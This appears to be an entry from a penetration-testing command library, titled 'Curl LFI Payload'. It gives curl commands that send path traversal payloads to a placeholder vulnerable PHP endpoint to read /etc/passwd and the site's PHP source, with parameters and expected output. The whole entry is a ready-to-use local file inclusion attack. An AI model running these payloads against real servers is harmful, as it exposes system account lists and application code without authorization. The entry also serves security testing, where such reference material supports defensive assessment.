---
data: 'curl "http://target.com/vulnerable.php?file=../../../../etc/passwd"'
tags:
  - lfi
  - web
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 29512f8f-0333-4414-91fb-eff9187ac7c5
created_at: '2025-12-13T09:00:27.450Z'
updated_at: '2025-12-13T09:00:27.450Z'
verified: false
validated: true
submitted: true
---
# Curl LFI Payload

## Command

```bash
curl "http://target.com/vulnerable.php?file=../../../../etc/passwd"
```

## Description

This command uses Curl to test and exploit Local File Inclusion by sending a path traversal payload to read arbitrary files.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | Target URL with vulnerable parameter | Yes |
| `file` | Path traversal payload | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/vulnerable.php?file=../../../../etc/passwd"
```

### Advanced Usage

```bash
curl --data "file=../../../../var/www/index.php" "http://target.com/vulnerable.php"
```

## Expected Output

Contents of the targeted file, such as system user list or PHP code.

## Related

- [[procedures/Exploit-Local-File-Inclusion-to-Read-PHP-Files]]
- [[tools/Curl]]
